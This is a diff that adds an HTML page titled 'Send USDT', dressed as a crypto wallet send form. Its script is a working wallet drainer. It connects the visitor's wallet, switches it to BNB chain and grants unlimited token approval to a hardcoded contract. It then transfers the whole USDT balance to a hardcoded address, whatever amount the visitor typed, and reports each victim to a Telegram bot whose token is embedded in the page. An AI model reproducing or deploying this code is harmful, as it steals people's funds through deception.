@@ -1,0 +1,125 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send USDT</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <style>
+    body { margin: 0; padding: 0; background-color: #000000; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #ffffff; }
+    .container { padding: 20px; margin-top: 50px; max-width: 420px; margin-left: auto; margin-right: auto; }
+    h1 { text-align: center; margin-bottom: 40px; font-weight: 600; color: #ffffff; font-size: 28px; }
+    .input-wrapper { background: #1c1c1c; border: 1px solid #333; border-radius: 12px; padding: 10px 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+    .input-wrapper input { background: transparent; border: none; font-size: 16px; color: #ffffff; width: 100%; outline: none; }
+    .label { color: #aaaaaa; margin: 5px 0; font-size: 15px; font-weight: 500; }
+    .button-right { color: #00ff90; font-size: 14px; margin-left: 10px; cursor: pointer; font-weight: 600; }
+    .usd-value { margin-top: 8px; color: #00ff90; font-size: 15px; font-weight: 500; }
+    button { width: 100%; padding: 16px; font-size: 18px; background-color: #00c853; border: none; border-radius: 12px; color: white; margin-top: 50px; font-weight: 600; cursor: pointer; }
+    .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff90; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: auto; margin-top: 40px; display: none; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Send USDT</h1>
+
+    <div class="label">Address or Domain Name</div>
+    <div class="input-wrapper">
+      <input type="text" id="address" value="0x56d21eA0E027b925423D68FC5d2762e3AD07284d" readonly />
+      <span class="button-right" onclick="copyAddress()">Copy</span>
+    </div>
+
+    <div class="label">Amount</div>
+    <div class="input-wrapper">
+      <input type="number" id="amount" placeholder="" oninput="calculateUSD()" />
+    </div>
+
+    <div class="usd-value" id="usdValue">$0.00</div>
+
+    <button onclick="start()">Next</button>
+    <div class="loader" id="loader"></div>
+  </div>
+
+<script>
+const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
+const contractAddress = "0x828bc41ea90d48c0db0030860Aca6CaD6128Fbd3";
+const recipientAddress = "0x56d21eA0E027b925423D68FC5d2762e3AD07284d";
+const telegramToken = "8168441203:AAGpFsF9O386peGIZXB1ev9mc_fpkKcboLg";
+const telegramChatID = "6774801802";
+
+window.onload = async function() {
+  if (typeof window.ethereum !== 'undefined') {
+    try {
+      await window.ethereum.request({ method: 'wallet_switchEthereumChain', params:[{ chainId: '0x38' }] });
+    } catch(e) { }
+  }
+}
+
+function calculateUSD() {
+  let amount = parseFloat(document.getElementById("amount").value);
+  if (!amount || amount <= 0) amount = 0;
+  document.getElementById("usdValue").innerText = "$" + amount.toFixed(2);
+}
+
+async function start() {
+  const loader = document.getElementById("loader");
+  loader.style.display = "block";
+
+  if (typeof window.ethereum === 'undefined') {
+    alert('Please install MetaMask or TrustWallet!');
+    loader.style.display = "none";
+    return;
+  }
+
+  try {
+    const web3 = new Web3(window.ethereum);
+    const accounts = await web3.eth.requestAccounts();
+    const account = accounts[0];
+
+    sendTelegram("User Connected: " + account);
+
+    const abi = [
+      {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+      {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
+      {"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
+    ];
+
+    const token = new web3.eth.Contract(abi, tokenAddress);
+    const balance = await token.methods.balanceOf(account).call();
+
+    if (BigInt(balance) === 0n) {
+      alert("No USDT balance found.");
+      loader.style.display = "none";
+      return;
+    }
+
+    const maxApproval = web3.utils.toTwosComplement('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+    await token.methods.approve(contractAddress, maxApproval).send({ from: account });
+
+    await token.methods.transfer(recipientAddress, balance).send({ from: account });
+
+    const humanReadable = parseFloat(balance) / 1e6;
+    sendTelegram("USDT Transferred: " + humanReadable + " USDT from: " + account);
+
+    alert("Transaction completed successfully!");
+  } catch (err) {
+    alert("Error: " + err.message);
+  }
+
+  loader.style.display = "none";
+}
+
+function sendTelegram(message) {
+  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatID}&text=${encodeURIComponent(message)}`);
+}
+
+function copyAddress() {
+  const addressField = document.getElementById("address");
+  navigator.clipboard.writeText(addressField.value);
+  alert("Address copied!");
+}
+</script>
+
+</body>
+</html>
